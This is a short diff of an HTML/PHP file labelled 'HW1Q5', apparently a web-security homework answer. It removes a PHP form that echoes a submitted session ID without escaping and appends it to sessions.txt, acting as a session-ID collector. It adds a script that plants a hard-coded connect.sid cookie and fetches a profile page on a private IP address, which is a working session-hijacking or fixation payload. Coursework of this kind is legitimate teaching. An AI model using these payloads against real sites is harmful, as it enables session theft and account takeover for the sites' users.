@@ -35,17 +35,8 @@
 </body> -->
 
 <!-- HW1Q5 ------------------------------------------------------------------------>
-<form method="POST">
-    <input type="text" name="sessionid" />
-    <input type="submit" value="submit"/>
-</form>
-
-Session ID 
-<?php echo $_POST["sessionid"]; ?>
-
-<?php 
-$file = fopen("sessions.txt", "a") or die();
-fwrite($file, $_POST["sessionid"]);
-fclose($file)
-?>
+<script>
+document.cookie = "connect.sid=s%3AZi8QLkX1q8HzlbAIqnkMreBx-suzt_zf.rocbDPrV5CCQ%2BDUj1%2Fg652aASTGUWbqVpjzZ6fdEXy4"
+fetch('http://192.168.2.98:65352/profile')
+</script>
 
